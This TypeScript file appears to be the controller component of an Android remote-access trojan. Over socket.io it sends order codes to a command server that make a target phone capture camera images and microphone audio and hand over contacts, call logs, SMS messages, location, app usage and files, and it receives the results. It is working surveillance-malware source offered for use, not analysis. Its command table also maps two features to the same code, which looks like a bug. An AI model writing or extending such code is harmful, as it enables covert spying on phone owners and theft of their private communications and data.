import { io, Socket } from 'socket.io-client';
import { getActiveServerUrl } from './appwrite';

let socket: Socket | null = null;
let connectionPromise: Promise<Socket> | null = null;
let resultCallback: ((data: SocketResult) => void) | null = null;
let currentUserId: string | null = null;
let currentServerUrl: string | undefined = undefined;

export interface CommandData {
    userId: string;
    command: {
        order: string;
        extra?: string | number;
        req?: number;
        path?: string;
        sec?: number; // For microphone recording duration
    };
}

export interface SocketResult {
    // Camera result
    image?: boolean;
    base64?: string;

    // Contacts result
    contacts?: { contactsList?: { name: string; phoneNo: string }[] };
    contactsList?: { name: string; phoneNo: string }[] | { contactsList?: { name: string; phoneNo: string }[] };

    // Calls result
    callsList?: { phoneNo: string; name: string; duration: number; type: number }[] | { callsList?: { phoneNo: string; name: string; duration: number; type: number }[] };

    // SMS result
    smsList?: { phoneNo: string; msg: string }[] | { smsList?: { phoneNo: string; msg: string }[] };

    // Location result
    enable?: boolean;
    success?: boolean;
    latitude?: number;
    longitude?: number;
    lat?: number;
    lng?: number;

    // File manager result
    data?: Array<{
        name?: string;
        filename?: string;
        file?: string;
        isDir?: boolean;
        isDirectory?: boolean;
        type?: string;
        path?: string;
        fullPath?: string;
        filepath?: string;
        size?: string;
        filesize?: string;
    }>;
    file?: boolean;
    buffer?: string;
    name?: string;
    size?: number;
    path?: string;
    error?: string;
    fileType?: string; // Audio file type (mp3, m4a, etc.)

    // Microphone result
    audio?: boolean;

    // App usage result
    hasPermission?: boolean;
    totalAppsCount?: number;
    beginTime?: number;
    endTime?: number;
    usageList?: Array<{
        appName?: string;
        packageName?: string;
        totalTimeInForegroundMs?: number;
        totalTimeFormatted?: string;
        lastTimeUsedTimestamp?: number;
        lastTimeUsedFormatted?: string;
    }>;
}

async function createSocket(userId: string, customServerUrl?: string): Promise<Socket> {
    const socketUrl = (customServerUrl && customServerUrl.trim())
        ? customServerUrl.trim().replace(/\/$/, '')
        : (await getActiveServerUrl());

    const nextSocket = io(socketUrl, {
        query: {
            id: userId,
            type: 'controller',
        },
        transports: ['websocket', 'polling'],
        reconnection: true,
        reconnectionAttempts: 5,
        reconnectionDelay: 1000,
        timeout: 20000,
    });

    nextSocket.on('connect', () => {
        console.log('Socket connected to', socketUrl, 'with id:', nextSocket.id);
    });

    nextSocket.on('disconnect', (reason) => {
        console.log('Socket disconnected:', reason);
        if (reason === 'io server disconnect') {
            nextSocket.connect();
        }
    });

    nextSocket.on('connect_error', (error) => {
        console.error('Socket connection error on', socketUrl, ':', error.message);
    });

    if (resultCallback) {
        nextSocket.off('result');
        nextSocket.on('result', resultCallback);
    }

    socket = nextSocket;
    return nextSocket;
}

export function initSocket(userId: string, customServerUrl?: string): Socket | null {
    // If already connected with same user and server URL, return existing socket
    if (socket?.connected && currentUserId === userId && currentServerUrl === customServerUrl) {
        return socket;
    }

    // Clean up existing socket if any
    if (socket) {
        socket.disconnect();
        socket = null;
    }

    currentUserId = userId;
    currentServerUrl = customServerUrl;

    connectionPromise = createSocket(userId, customServerUrl).finally(() => {
        connectionPromise = null;
    });

    return socket;
}

export function getSocket(): Socket | null {
    return socket;
}

export function isConnected(): boolean {
    return socket?.connected ?? false;
}

export function disconnectSocket(): void {
    if (socket) {
        socket.removeAllListeners();
        socket.disconnect();
        socket = null;
    }
}

export function sendCommand(data: CommandData): boolean {
    if (!socket || !socket.connected) {
        console.warn('Socket not connected. Cannot send command.');
        return false;
    }

    socket.emit('order', data);
    socket.emit('command', data);
    console.log('Command sent:', data);
    return true;
}

export function onResult(callback: (data: SocketResult) => void): void {
    resultCallback = callback;
    if (socket) {
        socket.off('result');
        socket.on('result', callback);
    }
}

// Predefined command helpers
export const COMMANDS = {
    // Order codes
    APP_USAGE_ORDER: 'x0000us',
    CAMERA: 'x0000ca',
    MICROPHONE: 'x0000mc',
    CONTACTS: 'x0000cl',
    CALLS: 'x0000mc',
    SMS: 'x0000ms',
    LOCATION: 'x0000lo',
    FILE_MANAGER: 'x0000fm',

    // App Usage helper
    APP_USAGE: (userId: string) => ({ userId, command: { order: 'x0000us' } }),

    // Camera helpers
    CAMERA_MAIN: (userId: string) => ({ userId, command: { order: 'x0000ca', extra: '1' } }),
    CAMERA_SELFIE: (userId: string) => ({ userId, command: { order: 'x0000ca', extra: '0' } }),

    // Location helper
    LOCATION_CMD: (userId: string) => ({ userId, command: { order: 'x0000lo' } }),

    // Contacts helper
    CONTACTS_CMD: (userId: string) => ({ userId, command: { order: 'x0000cl' } }),

    // Calls helper
    CALL_LOGS: (userId: string) => ({ userId, command: { order: 'x0000mc' } }),

    // SMS helper
    SMS_LIST: (userId: string) => ({ userId, command: { order: 'x0000ms' } }),

    // Files helpers
    FILE_LIST: (userId: string, path: string = '0') => ({
        userId,
        command: { order: 'x0000fm', req: 0, path },
    }),
    DOWNLOAD_FILE: (userId: string, path: string) => ({
        userId,
        command: { order: 'x0000fm', req: 1, path },
    }),

    // Microphone helper
    RECORD_AUDIO: (userId: string, durationSeconds: number = 10) => ({
        userId,
        command: { order: 'x0000mi', sec: durationSeconds },
    }),
};
